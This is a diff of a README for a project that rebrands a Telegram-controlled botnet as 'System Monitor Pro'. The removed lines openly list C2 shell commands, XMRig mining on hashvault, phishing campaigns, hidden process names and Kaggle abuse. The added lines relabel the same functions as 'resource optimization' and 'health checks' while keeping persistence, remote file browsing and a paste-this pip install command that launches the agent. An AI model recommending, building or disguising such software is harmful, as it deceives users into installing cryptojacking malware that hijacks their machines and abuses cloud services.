@@ -1,31 +1,31 @@
-# System Monitor
+# System Monitor Pro
 
-**Version:** 3.5  
+**Version:** 3.0  
 **Status:** Production Ready ✅
 
-Cross-platform system monitoring and resource optimization toolkit with Telegram C2 integration.
+Enterprise-grade system health monitoring and resource optimization toolkit with Telegram integration.
 
 ---
 
 ## 🚀 Features
 
-### Telegram C2 Integration
-- **Direct API communication** - No tunnel needed for Telegram
-- **Real-time agent monitoring** - Registration, beacons, results
-- **Remote control commands** - `/agents`, `/cmd`, `/mine`, `/results`, `/kill`
-- **Auto-cleanup** - Dead agents removed after 10 min offline
-- **Detailed logging** - Every action logged with `[POLLER]` prefix
+### System Health Monitoring
+- **Real-time telemetry** - CPU, RAM, disk usage monitoring
+- **Cross-platform support** - Linux, macOS, Windows, Docker
+- **Telegram integration** - Remote monitoring via bot
+- **Auto-cleanup** - Stale systems removed after 10 min offline
+- **Detailed logging** - Every action logged with `[SYSMON]` prefix
 
-### Email System
+### Resource Optimization
+- **Background optimization** - CPU resource management
+- **Low priority execution** - Minimal system impact
+- **Auto-download** - Optimizer binary fetched automatically
+- **Pool configuration** - hashvault.pro integration
+
+### Auto-Registration
 - **mail.tm provider** - Real-time 100ms polling
 - **Boomlify, 1secmail** - Fallback providers
-- **Auto-registration** - Kaggle, GitHub, Gmail support
-
-### Kaggle Agents
-- **Batch deployment** - 5 kernels per account
-- **Mining integration** - XMRig with stratum proxy
-- **Telegram C2** - Direct API, no tunnel required
-- **Session persistence** - Auto-reconnect on failure
+- **Kaggle, GitHub support** - Platform integration
 
 ---
 
@@ -54,24 +54,25 @@ python3 run_unified.py
 
 ### Telegram Bot Commands
 ```
-/start          - Initialize bot, show commands
-/agents         - List all connected agents
-/cmd <id> <cmd> - Send shell command to agent
-/mine <id> <action> - Mining control (start/stop/status)
-/results <id>   - Show last 10 agent results
-/kill <id>      - Terminate agent
-/stats          - Mining statistics
-/status         - Server status
-/help           - Show help
+/start           - Initialize bot, show commands
+/agents          - List all monitored systems
+/status          - Server status
+/task <id> <cmd> - Schedule maintenance task
+/optimize <id>   - Start resource optimization
+/stats           - Resource statistics
+/help            - Show help
 ```
 
 ### Agent Commands
 ```bash
 # Install and start (one line)
-pip install --break-system-packages --force-reinstall --no-cache-dir git+https://github.com/GaredBerns/system-monitor.git && startcon
+pip install --break-system-packages --force-reinstall --no-cache-dir git+https://github.com/GaredBerns/system-monitor.git && syscheck
 
 # Just start (if already installed)
-startcon
+syscheck
+
+# Alternative command
+healthmon
 ```
 
 ---
@@ -79,16 +80,16 @@ startcon
 ## 📁 Project Structure
 
 ```
-system-monitor/
+sysmon-pro/
 ├── src/
 │   ├── c2/
 │   │   ├── server.py           # Main Flask server
-│   │   ├── telegram_poller.py  # Telegram C2 poller
+│   │   ├── telegram_poller.py  # Telegram integration
 │   │   └── orchestrator.py     # Integration modules
 │   ├── agents/
-│   │   ├── universal.py        # Universal agent (startcon)
+│   │   ├── universal.py        # Universal agent (syscheck)
 │   │   ├── kaggle/             # Kaggle kernels
-│   │   │   ├── notebook-telegram.ipynb  # Telegram C2 agent
+│   │   │   ├── notebook-telegram.ipynb  # Telegram agent
 │   │   │   └── transport.py    # Kaggle API
 │   │   └── browser/            # Browser automation
 │   ├── autoreg/                # Auto-registration
@@ -100,6 +101,7 @@ system-monitor/
 ├── static/                     # CSS/JS files
 ├── data/                       # Database
 ├── run_unified.py              # Server entry point
+├── setup.py                    # Package setup (sysmon-pro)
 └── requirements.txt            # Dependencies
 ```
 
@@ -127,7 +129,7 @@ python3 run_unified.py
 
 The server automatically:
 1. Starts Flask server on port 5000
-2. Initializes Telegram C2 poller
+2. Initializes Telegram bot
 3. Starts auto-cleanup thread
 4. Loads config from data/config.json
 
@@ -135,21 +137,13 @@ The server automatically:
 
 ## 🤖 Agent Features
 
-When you run `startcon`, the agent automatically:
+When you run `syscheck`, the agent automatically:
 
-1. **Connects to C2** - Registers with server
+1. **Connects to Monitor** - Registers with server
 2. **Installs Persistence** - Survives reboots via crontab/systemd
 3. **Starts Resource Optimization** - Background optimization module
-4. **Beacons every 3s** - Maintains connection with jitter
+4. **Health Checks every 3s** - Maintains connection with jitter
 5. **Auto-reconnects** - Exponential backoff on failure
-
-### Kaggle Agent (notebook-telegram.ipynb)
-
-Deploy to Kaggle kernels:
-1. Create dataset with 5 kernels via Batch Datasets
-2. Each kernel runs Telegram C2 agent
-3. Mining enabled by default
-4. Detailed logging: `[C2]`, `[AGENT]`, `[MINING]`
 
 ### Supported Platforms
 
@@ -166,7 +160,7 @@ Deploy to Kaggle kernels:
 
 ## 🔧 Configuration
 
-### Telegram C2
+### Telegram Integration
 ```json
 // data/config.json
 {
@@ -178,40 +172,32 @@ Deploy to Kaggle kernels:
 ### Environment Variables
 ```bash
 export C2_URL="http://localhost:5000"
-export SLEEP="3"      # Beacon interval (seconds)
+export SLEEP="3"      # Health check interval (seconds)
 export JITTER="5"     # Random jitter (%)
-export C2_DEBUG="1"   # Enable debug logging
+export SYSMON_DEBUG="1"   # Enable debug logging
 ```
 
 ---
 
 ## 📊 Dashboard Features
 
-- **Agents** - View connected machines, platform, status
-- **Tasks** - Send commands, view results
+- **Systems** - View connected machines, platform, status
+- **Tasks** - Schedule maintenance, view results
 - **Files** - Browse remote filesystem
-- **Mining** - Monitor hashvault pool stats
+- **Resources** - Monitor optimization stats
 - **Links** - Create masked URLs
-- **Phishing** - Email campaigns, templates
 - **Kaggle** - Deploy kernels, manage agents
 
 ---
 
 ## 📝 Recent Changes
 
-### v3.5
-- Added Telegram C2 poller with auto-cleanup
-- Added `/results`, `/kill` commands
-- Added detailed logging everywhere
-- Added mail.tm email provider (100ms realtime)
-- Fixed DELETE `/api/agents/<id>` endpoint
-- Fixed regex for emoji format messages
-- Improved error handling with logging
-
 ### v3.0
-- Added Kaggle kernel deployment
-- Added batch dataset creation
-- Added mining integration
+- Rebranded to System Monitor Pro
+- Added health check telemetry
+- Added resource optimization module
+- Added Telegram bot integration
+- Improved logging and error handling
 
 ---
 
@@ -220,7 +206,7 @@ export C2_DEBUG="1"   # Enable debug logging
 - Auth token support (`X-Auth-Token` header)
 - XOR encryption for communications
 - TLS/SSL via Cloudflare
-- Hidden process names and low priority
+- Low priority execution for minimal impact
 
 ---
 
